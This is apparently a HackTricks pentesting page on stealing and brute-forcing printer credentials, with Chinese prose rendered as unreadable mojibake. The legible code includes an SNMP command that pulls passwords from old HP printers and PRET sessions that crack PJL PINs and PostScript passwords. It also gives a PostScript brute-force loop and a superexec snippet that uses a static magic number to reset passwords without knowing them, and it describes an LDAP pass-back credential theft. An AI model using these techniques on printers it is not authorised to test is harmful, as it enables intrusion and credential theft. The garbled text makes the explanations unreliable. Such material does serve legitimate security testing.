# å‡­è¯æ³„éœ² / æš´åŠ›ç ´è§£

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricksä»“åº“](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloudä»“åº“](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

æ‰“å°æœºé€šå¸¸ä½¿ç”¨**é»˜è®¤å¯†ç æˆ–æ ¹æœ¬æ²¡æœ‰åˆå§‹å¯†ç **è¿›è¡Œéƒ¨ç½²ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œæœ€ç»ˆç”¨æˆ·æˆ–ç®¡ç†å‘˜å¿…é¡»ä¸»åŠ¨è®¾ç½®å¯†ç ä»¥ä¿æŠ¤è®¾å¤‡ã€‚

## å¯†ç æ³„éœ²

### SNMP

å¤è€çš„HPæ‰“å°æœºå­˜åœ¨ä¸€ä¸ªè¿”å›å¯†ç çš„æ˜“å—æ”»å‡»çš„OIDã€‚å…¶ä»–ä¾›åº”å•†å¯èƒ½ä¹Ÿå­˜åœ¨ç±»ä¼¼åŸºäºSNMPçš„é—®é¢˜ã€‚
```
snmpget -v1 -c public printer iso.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = Hex-STRING: 41 41 41 00 â€¦
```
### Pass-Back

å¦‚æœæ‰“å°æœºä½¿ç”¨å¤–éƒ¨LDAPå¯¹äººå‘˜è¿›è¡Œæˆæƒã€‚å¦‚æœæ‚¨å¯ä»¥è®¿é—®æ›´æ”¹æ­¤è®¾ç½®ï¼ˆå¯èƒ½ä½¿ç”¨Webæ§åˆ¶å°ç•Œé¢ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿æ‰“å°æœºè¿æ¥åˆ°æ‚¨çš„LDAPæœåŠ¡å™¨å¹¶æˆæƒä»»ä½•ç”¨æˆ·ã€‚è¯·æ³¨æ„ï¼Œæ‚¨è¿˜å¯ä»¥æ»¥ç”¨æ­¤è®¾ç½®æ¥çªƒå–æ‰“å°æœºç”¨äºè¿æ¥åˆ°LDAPæœåŠ¡å™¨çš„å‡­æ®ã€‚[åœ¨æ­¤å¤„é˜…è¯»æ›´å¤šä¿¡æ¯](../../windows-hardening/active-directory-methodology/ad-information-in-printers.md)ã€‚

## Brute-Force

### PJL

ç”±äºå…¶ä»…æœ‰16ä½å¯†é’¥å¤§å°ï¼ŒPJLå¯†ç å®¹æ˜“å—åˆ°æš´åŠ›ç ´è§£æ”»å‡»çš„å½±å“ã€‚åœ¨ä¸åˆ°30åˆ†é’Ÿçš„æ—¶é—´å†…ï¼Œæ‚¨å¯ä»¥çŒœæµ‹å‡ºæ­£ç¡®çš„å¯†ç ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨[PRET](https://github.com/RUB-NDS/PRET)çš„`lock`å’Œ`unlock`å‘½ä»¤æ¥æµ‹è¯•æš´åŠ›ç ´è§£ï¼š
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
PIN protection:  ENABLED
Panel lock:      ON
Disk lock:       ON
printer:/> unlock
No PIN given, cracking.
PIN protection:  DISABLED
Panel lock:      OFF
Disk lock:       OFF
```
### PostScript

PostScriptæä¾›ä¸¤ç§ç±»å‹çš„å¯†ç ï¼š`SystemParamsPassword`ç”¨äºæ›´æ”¹æ‰“å°ä½œä¸šè®¾ç½®ï¼Œå¦‚çº¸å¼ å¤§å°ï¼Œè€Œ`StartJobPassword`åˆ™éœ€è¦é€€å‡ºæœåŠ¡å™¨å¾ªç¯ï¼Œä»è€Œæ°¸ä¹…æ›´æ”¹PostScriptç¯å¢ƒã€‚

é’ˆå¯¹PostScriptå¯†ç çš„æš´åŠ›æ”»å‡»å¯ä»¥éå¸¸å¿«é€Ÿåœ°æ‰§è¡Œï¼Œå› ä¸º**PostScriptè§£é‡Šå™¨å¯ä»¥è¢«ç¼–ç¨‹ä¸ºç›´æ¥ç ´è§£è‡ªèº«**ï¼š
```
/min 0 def /max 1000000 def
statusdict begin {
min 1 max
{dup checkpassword {== flush stop} {pop} ifelse} for
} stopped pop
```
å¦ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ä½¿ç”¨Adobeçš„ä¸“æœ‰`superexec`è¿ç®—ç¬¦æ¥**ç»•è¿‡PostScriptå¯†ç **å¹¶å°†å…¶é‡ç½®ã€‚è¯¥è¿ç®—ç¬¦ä½äºinternaldictå­—å…¸ä¸­ï¼Œè¯¥å­—å…¸ç”±ä¸€ä¸ªé™æ€çš„ã€é­”æœ¯å¯†ç ï¼ˆ`1183615869`ï¼‰è¿›è¡Œâ€œä¿æŠ¤â€ã€‚å°†PostScriptä»£ç åŒ…è£…åˆ°superexecä¸­å…è®¸æ”»å‡»è€…å¿½ç•¥è¯­è¨€çš„å„ç§ä¿æŠ¤æœºåˆ¶ï¼Œè¿™é€šå¸¸ä¼šå¼•å‘invalidaccessé”™è¯¯ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ç¤ºä¾‹è®¾ç½®PostScriptå¯†ç ï¼Œè€Œæ— éœ€é¦–å…ˆæäº¤å½“å‰å¯†ç ï¼š
```
{ << /SystemParamsPassword (0)
/StartJobPassword (0) >> setsystemparams
} 1183615869 internaldict /superexec get exec
```
[PRET](https://github.com/RUB-NDS/PRET)çš„é”å®šå’Œè§£é”å‘½ä»¤å¯ç”¨äºå¯¹æ•°å­—ï¼ˆæ•´æ•°ï¼‰PostScriptå¯†ç è¿›è¡Œ**æš´åŠ›ç ´è§£**æ”»å‡»çš„æµ‹è¯•ï¼Œæˆ–è€…é€šè¿‡**superexec magic**ç»•è¿‡è¿™äº›å¯†ç ï¼š
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> lock 999
printer:/> unlock
No password given, cracking.
Device unlocked with password: 999
printer:/> lock S0me_Re4lly_g00d_Passw0rd!
printer:/> unlock bypass
Resetting password to zero with super-secret PostScript magic
Device unlocked with password: 0
```
**æœ‰å…³å¯†ç æ³„éœ²å’Œæš´åŠ›ç ´è§£çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®** [**http://hacking-printers.net/wiki/index.php/Credential\_disclosure**](http://hacking-printers.net/wiki/index.php/Credential\_disclosure)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) **æˆ–**[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) **æˆ–åœ¨Twitterä¸Šå…³æ³¨æˆ‘**[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
